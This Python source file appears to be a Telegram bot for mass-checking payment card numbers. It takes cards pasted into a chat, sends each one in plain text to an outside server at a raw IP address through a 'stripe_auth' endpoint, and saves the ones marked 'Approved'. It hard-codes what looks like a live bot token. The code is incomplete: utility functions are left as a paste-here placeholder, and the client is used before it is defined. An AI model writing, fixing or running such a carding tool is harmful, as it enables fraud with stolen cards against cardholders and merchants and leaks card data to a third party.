from telethon import TelegramClient, events, Button
import requests, random, datetime, json, os, re, asyncio, time
import string
import aiohttp
import aiofiles
from urllib.parse import urlparse

# ================== CONFIG ==================
BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"  # Your Bot Token
ADMIN_ID = [7077294261, 8496671308, 1308204344, 7856977111, 7029965057, 5295792382, 1965289355, 8467239599, 7249106493, 7292047135, 8368859527, 7582867285]
GROUP_ID = -1003200643667

# Files
PREMIUM_FILE = "premium.json"
FREE_FILE = "free_users.json"
SITE_FILE = "user_sites.json"
KEYS_FILE = "keys.json"
CC_FILE = "cc.txt"
BANNED_FILE = "banned_users.json"
PROXY_FILE = "proxy.json"

ACTIVE_MTXT_PROCESSES = {}
TEMP_WORKING_SITES = {}

# ====================== STRIPE API ======================
async def check_card_stripe_api(card):
    try:
        url = f"http://138.128.240.15:8009/stripe_auth?cc={card}"
        timeout = aiohttp.ClientTimeout(total=50)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"Response": f"HTTP_{res.status}", "Price": "-", "Gateway": "Stripe Auth", "Status": "Error"}
                
                data = await res.json()
                response_text = data.get("Response", str(data))
                gateway = data.get("Gate", "Stripe Auth")
                
                if isinstance(response_text, str) and response_text.startswith("{"):
                    try:
                        rj = json.loads(response_text)
                        response_text = rj.get("data", {}).get("error", {}).get("message", response_text)
                    except:
                        pass
                
                lower = str(response_text).lower()
                status = "Approved" if any(x in lower for x in ["approved", "success", "insufficient_funds"]) else "Declined"
                
                return {
                    "Response": str(response_text)[:250],
                    "Price": "-",
                    "Gateway": gateway,
                    "Status": status
                }
    except Exception as e:
        return {"Response": f"Error: {str(e)[:100]}", "Price": "-", "Gateway": "Stripe Auth", "Status": "Error"}


# ================== UTILITY FUNCTIONS ==================
# (Keep all your existing utility functions here: load_json, save_json, is_premium_user, etc.)
# ... Paste all your old utility functions ...

# ================== MST COMMAND (STRIPE) ==================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mst'))
async def mst(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("🚫 Use in group for free access!")

    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        cards = extract_all_cards(replied.text)
    else:
        cards = extract_all_cards(event.raw_text)

    if not cards:
        return await event.reply("❌ No valid cards found!")

    if len(cards) > 100:
        cards = cards[:100]

    asyncio.create_task(process_mst_stripe(event, cards))


async def process_mst_stripe(event, cards):
    total = len(cards)
    checked = approved = declined = 0
    status_msg = await event.reply(f"🔥 **Stripe Mass Checker Started**\nTotal: {total}")

    for i in range(0, len(cards), 10):
        batch = cards[i:i+10]
        tasks = [check_card_stripe_api(card) for card in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for card, result in zip(batch, results):
            if isinstance(result, Exception):
                result = {"Response": "Timeout", "Gateway": "Stripe Auth", "Status": "Declined"}

            checked += 1
            if result.get("Status") == "Approved":
                approved += 1
                await save_approved_card(card, "APPROVED", result.get("Response"), "Stripe Auth", "-")
                await event.reply(f"""💎 **APPROVED**

`{card}`
Response: {result.get('Response')}""")
            else:
                declined += 1

            progress = f"""**🔄 Stripe Mass Check**
✅ Approved: {approved}
❌ Declined: {declined}
Progress: {checked}/{total}"""
            try:
                await status_msg.edit(progress)
            except:
                pass
            await asyncio.sleep(1.1)

    await status_msg.edit(f"""✅ **Check Completed!**

✅ Approved: **{approved}**
❌ Declined: **{declined}**
Total: **{total}**""")


# ================== BOT START ==================
client = TelegramClient('bot', api_id=None, api_hash=None)  # No API ID/Hash needed

async def main():
    await initialize_files()
    print("🤖 BOT RUNNING WITH BOT TOKEN ONLY")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
